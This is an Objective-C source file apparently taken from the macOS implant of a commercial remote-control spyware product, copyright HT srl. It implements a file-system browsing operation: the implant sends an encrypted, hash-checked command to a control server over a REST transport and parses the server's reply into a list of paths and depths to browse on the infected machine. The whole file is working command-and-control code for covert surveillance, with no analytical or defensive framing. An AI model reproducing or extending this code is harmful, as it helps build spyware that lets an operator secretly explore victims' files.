/*
 * RCSMac - FileSystem Browsing Network Operation
 *
 *
 * Created on 12/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "FSNetworkOperation.h"
#import "NSMutableData+AES128.h"
#import "FSNetworkOperation.h"
#import "NSString+SHA1.h"
#import "NSData+SHA1.h"
#import "NSData+Pascal.h"
#import "RCSICommon.h"

//#import "RCSMLogger.h"
//#import "RCSMDebug.h"


@implementation FSNetworkOperation

@synthesize mPaths;

- (id)initWithTransport: (RESTTransport *)aTransport
{
  if (self = [super init])
    {
      mTransport = aTransport;
      mPaths = [[NSMutableArray alloc] init];
    
#ifdef DEBUG_FS_NOP
      infoLog(@"mTransport: %@", mTransport);
#endif
      return self;
    }
  
  return nil;
}

- (void)dealloc
{
  [mPaths release];
  [super dealloc];
}

- (BOOL)perform
{
#ifdef DEBUG_FS_NOP
  infoLog(@"");
#endif
  
  uint32_t command              = PROTO_FILESYSTEM;
  NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
  NSMutableData *commandData    = [[NSMutableData alloc] initWithBytes: &command
                                                                length: sizeof(uint32_t)];
  NSData *commandSha            = [commandData sha1Hash];
  
  [commandData appendData: commandSha];
  
#ifdef DEBUG_FS_NOP
  infoLog(@"commandData: %@", commandData);
#endif
  
  [commandData encryptWithKey: gSessionKey];
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  NSMutableData *replyDecrypted = nil;
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];
  
  if (replyData == nil)
    {
#ifdef DEBUG_FS_NOP
      errorLog(@"empty reply from server");
#endif
      [commandData release];
      [outerPool release];
    
      return NO;
    }
  
  replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
  [replyDecrypted decryptWithKey: gSessionKey];
  
#ifdef DEBUG_FS_NOP
  infoLog(@"replyDecrypted: %@", replyDecrypted);
#endif
  
  [replyDecrypted getBytes: &command
                    length: sizeof(uint32_t)];
  
  // remove padding
  [replyDecrypted removePadding];
  
  //
  // check integrity
  //
  NSData *shaRemote;
  NSData *shaLocal;
  
  @try
    {
      shaRemote = [replyDecrypted subdataWithRange:
                   NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                               CC_SHA1_DIGEST_LENGTH)];
      shaLocal = [replyDecrypted subdataWithRange:
                  NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_FS_NOP
      errorLog(@"exception on sha makerange (%@)", [e reason]);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  shaLocal = [shaLocal sha1Hash];
  
#ifdef DEBUG_FS_NOP
  infoLog(@"shaRemote: %@", shaRemote);
  infoLog(@"shaLocal : %@", shaLocal);
#endif
  
  if ([shaRemote isEqualToData: shaLocal] == NO)
    {
#ifdef DEBUG_FS_NOP
      errorLog(@"sha mismatch");
#endif
    
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  if (command != PROTO_OK)
    {
#ifdef DEBUG_FS_NOP
      errorLog(@"No fs request available (command %d)", command);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  uint32_t packetSize     = 0;
  uint32_t numOfEntries   = 0;
  
  @try
    {
      [replyDecrypted getBytes: &packetSize
                         range: NSMakeRange(4, sizeof(uint32_t))];
      [replyDecrypted getBytes: &numOfEntries
                         range: NSMakeRange(8, sizeof(uint32_t))];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_FS_NOP
      errorLog(@"exception on parameters makerange (%@)", [e reason]);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  NSMutableData *data;
  @try
    {
      data = [NSMutableData dataWithData:
              [replyDecrypted subdataWithRange: NSMakeRange(12, packetSize - 4)]];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_FS_NOP
      errorLog(@"exception on data makerange (%@)", [e reason]);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  uint32_t len = 0;
  uint32_t i   = 0;
  
  //
  // Unpascalize n NULL terminated UTF16LE strings
  // depth(int) + UTF16-LE PASCAL Null-Terminated
  //
  for (; i < numOfEntries; i++)
    {
      uint32_t depth = 0;
      [data getBytes: &depth length: sizeof(uint32_t)];
      
      @try
        {
          [data getBytes: &len range: NSMakeRange(4, sizeof(uint32_t))];
        }
      @catch (NSException *e)
        {
#ifdef DEBUG_FS_NOP
          errorLog(@"exception on len makerange (%@)", [e reason]);
#endif
          
          [replyDecrypted release];
          [commandData release];
          [outerPool release];
          
          return NO;
        }
      
      NSNumber *depthN = [NSNumber numberWithUnsignedInt: depth];
      
#ifdef DEBUG_FS_NOP
      infoLog(@"depth: %d", depth);
      infoLog(@"len  : %d", len);
#endif
      
      NSData *stringData;
      
      @try
        {
          stringData  = [data subdataWithRange: NSMakeRange(4, len + 4)];
        }
      @catch (NSException *e)
        {
#ifdef DEBUG_FS_NOP
          errorLog(@"exception on stringData makerange (%@)", [e reason]);
#endif
          
          [replyDecrypted release];
          [commandData release];
          [outerPool release];
          
          return NO;
        }
      
      NSString *string    = [stringData unpascalizeToStringWithEncoding: NSUTF16LittleEndianStringEncoding];
      
#ifdef DEBUG_FS_NOP
      infoLog(@"string: %@", string);
#endif
      
      //
      // Serialize with depth in a NSMutableDictionary
      //
      NSArray *keys = [NSArray arrayWithObjects: @"depth",
                                                 @"path",
                                                 nil];
      
      NSArray *objects = [NSArray arrayWithObjects: depthN,
                                                    string,
                                                    nil];
      
      NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                             forKeys: keys];
      [mPaths addObject: dictionary];
      
#ifdef DEBUG_FS_NOP
      infoLog(@"mPaths: %@", mPaths);
#endif
      
      @try
        {
          [data replaceBytesInRange: NSMakeRange(0, len + 8)
                          withBytes: NULL
                             length: 0];
        }
      @catch (NSException *e)
        {
#ifdef DEBUG_FS_NOP
          errorLog(@"exception on replaceBytes makerange (%@)", [e reason]);
#endif
          
          [replyDecrypted release];
          [commandData release];
          [outerPool release];
          
          return NO;
        }
    }
  
  [replyDecrypted release];
  [commandData release];
  [outerPool release];
  
  return YES;
}
@end